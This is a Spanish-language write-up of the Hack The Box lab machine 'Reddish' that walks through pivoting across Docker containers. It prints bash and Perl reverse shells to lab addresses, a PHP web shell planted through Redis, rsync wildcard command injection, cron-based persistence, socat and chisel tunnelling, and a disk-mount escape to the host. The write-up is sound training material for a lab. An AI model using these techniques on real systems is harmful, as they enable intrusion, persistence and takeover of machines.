---
layout: single
title: Reddish - Hack The Box
excerpt: "Esta máquina es muy buena para practicar para la certificación eCPPTv2 debido a que se toca mucho Pivoting. Estaremos todo el rato saltando entre contenedores gestionados con docker. Nos aprovecharemos de NodeRed para ganar acceso al primer contedor y luego de redis y de rsync para entrar en los siguientes."
date: 2023-09-07
classes: wide
header:
  teaser: /assets/images/htb-writeup-reddish/reddish_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - Linux
  - Pivoting
  - Redis
  - Rsync
  - Tareas cron
  - Monturas
---

![](/assets/images/htb-writeup-reddish/reddish_logo.png)

## Esquema de las interfaces:
![](/assets/images/htb-writeup-reddish/reddish_interfaces.png)

## Enumeración y explotación Node-Red
Puertos Abiertos:
![](/assets/images/htb-writeup-reddish/puerto_abierto.png)

Al abrir la web vemos un detalle interesante y es el logo de Node-Red. Podemos descubrilo tambien haciendole una petición con curl por POST a la web y nos saldrá un mensaje en json indicandonos una ruta para acceder
![](/assets/images/htb-writeup-reddish/peticion_post.png)

Si entramos en esa ruta veremos la pagina web de Node-Red. Una forma sencilla de entablarnos una reverse shell seria insertando nuestro propio código en json e importandolo. Podemos encontrar el payload en este recurso de github: [Node-Red Reverse Shell](https://github.com/valkyrix/Node-Red-Reverse-Shell/blob/master/node-red-reverse-shell.json)
Tendremos que cambiar el host y el puerto.
![](/assets/images/htb-writeup-reddish/node_red_codigo.png)


Para importarlo nos iremos al menú de arriba a la derecha > Import > Clipboard y aceptamos. Veremos que se nos crea un esquema y solo tendriamos que ponernos en esucha con netcat por el puerto indicado y darle a **Deploy**. Con esto tendremos una consola siempre que nos pongamos en escucha en ese puerto.
![](/assets/images/htb-writeup-reddish/netcat_code_red.png)


Para entablarnos una consola interactiva podemos usar el comando de bash ya que no podremos hacer un tratamiento de la TTY en la consola de Node-Red
```bash
bash -c 'bash -i >&/dev/tcp/10.10.14.11/444 0>&1'
```
Nos ponemos en escucha por el puerto 444 y hacemos el tratamiento de la TTY. Con esto entraremos como root

```bash
script /dev/null -c bash
ctrl + z
stty raw -echo;fg
reset xterm
```
## Descubrimiento de hosts y sus puertos

Una vez dentro si hacemos **hostname -I** nos daremos cuenta de que tenemos varias interfaces: **172.18.0.2 172.19.0.3** (Estas IP pueden variar debido a que docker asigna IP dinámicas a los contenedores). Por lo que ahora tendriamos que descubrir si hay mas hosts abiertos. Lo podemos hacer con este script:
```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Saliendo....\n"
	exit 1
}

# Ctrl + C
trap ctrl_c INT

networks=(172.18.0 172.19.0)

for network in ${networks[@]}; do
	echo -e "[+] Enumerando el network $network: "
	for host in $(seq 1 254); do 
		timeout 1 bash -c "ping -c 1 $network.$host" &>/dev/null && echo "HOST $network.$host ACTIVO" &
	done; wait
done
```
Para pasarlo a la máquina lo tendremos que hacer en base64 porque no disponemos de nano ni vi.
![](/assets/images/htb-writeup-reddish/hosts_activos.png)

Despues de esto toca descubrir los puertos. Escanearemos los primeros 10000:
```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n[!] Saliendo...\n"
	tput cnorm;exit 1
}

# Ctrl + C
trap ctrl_c INT

hosts=(172.18.0.1 172.18.0.2 172.19.0.1 172.19.0.2 172.19.0.3 172.19.0.4)
tput civis
for host in ${hosts[@]}; do
	echo -e "Escaneando puertos del host $host: "
	for port in $(seq 1 10000); do
		timeout 1 bash -c "(echo '' > /dev/tcp/$host/$port)" 2>/dev/null && echo -e "[+] Puerto $port - Abierto" &
	done; wait
done
tput cnorm

```
![](/assets/images/htb-writeup-reddish/puertos_activos.png)

Con esto podemos sacar varias conclusiones y es que la máquina Reddish estaba exponiendo el puerto 1880 a través de un contenedor y que tenemos 2 hosts interesantes: **172.19.0.4 172.19.0.2** La primera con el puerto 80 abierto y la segunda con el 6379. Por lo que es hora de usar **Chisel** para traernos esos puertos y poder enumerarlos.
<br>[Descargar Chisel](https://github.com/jpillora/chisel)<br>
Como el contenedor no posee ni **wget** ni **curl** podemos usar un recurso muy bueno para crearnos nuestra propia funcion **__curl** o **__wget**: [Enlace al código](https://unix.stackexchange.com/questions/83926/how-to-download-a-file-using-just-bash-and-nothing-else-no-curl-wget-perl-et). Solo tendremos que copiar el código directamente en la consola. Yo usaré el de curl:
```bash
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}

```
La manera de uso seria:
```bash
__curl http://10.10.14.11/chisel > chisel
```
Teniendo el **chisel** en ambas máquinas lo ejecutaremos como **root** en nuestra máquina:
```bash
./chisel server 10.10.14.11 --reverse -p 1234
```
Y en la máquina victima:
```bash
./chisel client 10.10.14.11:1234 R:80:172.19.0.4:80 R:6379:172.19.0.2:6379
```
O podriamos poner solo **R:socks** y jugar con **proxychains** pero yo lo haré de la otra manera. Con esto conseguimos que nuestro puerto 80 se convierta en el 80 de la 172.19.0.4 y nuestro puerto 6379 en el de la 172.19.0.2

## Enumeración Puerto 80
En el código HTML de la web descubrimos unas rutas un tanto extrañas.
![](/assets/images/htb-writeup-reddish/html_hints.png)

La funcion de **backup** parece no estar disponible. Debido a como es el código podriamos intentar un **Local File Inclusion** pero no nos va a funcionar. Si analizamos lo que hace **get hits** y **incr hits** es contar el numero de veces que recargamos la pagina. Podemos comprobarlo haciendo ctrl + shift + c y recargando.
![](/assets/images/htb-writeup-reddish/incrementar_hits_web.png)

Antes de hacer **Fuzzing** miremos el servicio redis(6379)


## Enumeración y explotación de Redis (6379)

Estaremos usando el recurso de **hacktricks**: [Enumeracion Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)<br>
Al final encontreremos una base de datos relacionada con el numero de hits que teniamos en el servicio web. Lo podemos comprobar recargando la web y viendo como el contador en redis aumenta.
![](/assets/images/htb-writeup-reddish/redis_database.png)

Por lo que esto es sospechoso. Si seguimos investigando en la web de hacktricks veremos que hay una forma de **incluir archivos en la máquina** por lo que podemos comprobar si funciona. Pero **¿donde incluimos en archivo?**, pues podemos suponer que la ruta es **/var/www/html** y la que nos indica en la web 8924d0549008565c554f8128cd11fda4.

Primero crearemos un archivo **cmd.php** con el siguiente codigo:
```php
<?php
	system($_REQUEST['cmd']);
?>
```
Destacar que es importante que el código tenga **tres saltos de linea al principio y dos saltos al final**. Esto es debido a que redis al subir archivos mete información en esas líneas y puede darnos problemas.

Subiremos el archivo de la siguiente manera. Es recomendable meterlo en un script ya que la máquina borra los archivos que subas cada cierto tiempo:
```bash
#!/bin/bash

cat cmd.php | redis-cli -h localhost -x set reverse 
redis-cli -h localhost config set dir /var/www/html/8924d0549008565c554f8128cd11fda4
redis-cli -h localhost config set dbfilename "cmd.php"
redis-cli -h localhost save
```

Si comprobamos si existe ese archio veremos que sí y que podemos ejecutar comandos. Ahora es el momento de entablarnos una reverse shell, pero como no tenemos conectividad con nuestra máquina deberemos usar **socat** para que funcione: [Descargar Socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)

Para usarlo lo transferiremos a la máquina Node-Red y pondremos:
```bash
./socat TCP-LISTEN:4444,fork TCP:10.10.14.11:444
```
Y desde el archivo cmd.php enviaremos la reverse shell a la máquina **Node-Red** por el puerto **4444**. En nuestra máquina nos pondremos en escucha por el puerto 444.

Un artículo muy bueno para entender mejor el pivoting con Socat es el siguiente: [Pivoting con Socat](https://deephacking.tech/pivoting-con-socat/) 

Una manera para no liarte con las conexiones es usar **Obsidian** como en el esquema del principio. Así sabrás siempre por donde enviar y redirigir el tráfico de la reverse shell

## Escalada de Privilegios con www-data

Dentro de la máquina **www** tenemos que escalar privilegios como **www-data**. Para ello nos aprovecharemos de una **tarea cron** llamada backup y ejecutando el script **/backup/backup.sh** con el siguiente código:
```bash
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync -a *.rdb rsync://backup:873/src/rdb/
cd / && rm -rf /var/www/html/*
rsync -a rsync://backup:873/src/backup/ /var/www/html/
chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
```

**¿Cómo nos aprovechamos de esto?**
Este código está usando **Wildcard (*)** por lo que está confiando en el input del usuario y nos podemos aprovechar de eso.
Si buscamos en **GTFObins rsync** nos daremos cuenta de que hay una forma de ejecutar comandos. Para ello crearemos un archivo **shell.rdb** con un codigo en bash que asigne privilegios SUID a la /bin/bash y lo meteremos en la ruta /var/www/html/f187a0ec71ce99642e4f0afbd441a68b. 
Posteriormente creamos otro archivo con nombre '-e sh shell.sh' en la misma ruta que antes:
```bash
touch -- '-e sh shell.rdb'
```

Al usar wildcards rsync creerá que estamos ejecutando este comando:
```bash
rsync -a -e sh shell.rdb
```
Por lo que estaremos ejecutando el script shell.rdb y consiguiendo que la bash tenga permisos SUID. Ganando acceso como root.

Todavia no estamos en la máquina Reddish y vemos otro host llamado **backup** que si le hacemos un **ping** nos daremos cuenta de que es la **172.20.0.2** y si realizamos **hostname -I** encontraremos la interfaz **172.20.0**

## Ganando acceso al último contenedor con rsync

Podemos usar rsync para listar los archivos de la 172.20.0.2 pero tambien podemos **incluir archivos**. Por lo que si creamos una tarea cron que se ejecute cada minuto dentro del **/etc/cron.d** y que ejecute un script que nos entable una reverse shell podremos ganar acceso. 
Para realizar esto debemos tener el **socat** en la máquina **www**. Para ello entraremos en la máquina Node-Red y crearemos el siguiente tunel:
```bash
./socat TCP-LISTEN:4777,fork TCP:10.10.14.11:8080
```
En nuestra máquina nos montaremos el servidor en python3 compartiendo socat por el puerto 8080 y desde la máquina **www** nos lo descargaremos:
```bash
__curl http://172.19.0.3:4777/socat > socat 
```
Con el socat en la máquina podemos definir la tarea cron llamada **shell**:
```bash
* * * * * root sh /tmp/reverse.sh
```
Definimos reverse.sh. En este caso nos enviaremos la reverse shell a la máquina **www** para no pasar entre todas las restantes
```bash
#!/bin/bash
perl -e 'use Socket;$i="172.19.0.4";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
Subimos los archivos shell y reverse.sh
```bash
rsync shell rsync://backup/src/etc/cron.d/shell
rsync reverse.sh rsync://backup/src/tmp/reverse.sh
```
Nos ponemos en escucha con socat de la siguiente manera:
```bash
./socat TCP-LISTEN:4444 stdout
```
Haremos el tratamiento de la TTY y ganaremos acceso como root. Ya no hay mas contendores! solo falta acceder a la máquina real. 
## Ganando acceso a la máquina Reddish
Si vemos las monturas con **df -h** veremos que está montado **/dev/sda2** en **/backup** y además, en el resto de máquinas es diferente. Como somos root podemos crear un directorio llamado privesc en **/mnt** y montar **/dev/sda2** en esa ruta. Al entrar nos daremos cuenta de que es otro sistema de archivos y que podemos leer las flags de **root.txt** y **user.txt**. Al tratarse de una montura todo lo que hagamos en ella se producirá en la máquina real por lo que si **volvemos a crear una tarea cron que nos entable una reverse shell** obtendremos acceso a la máquina **Reddish**
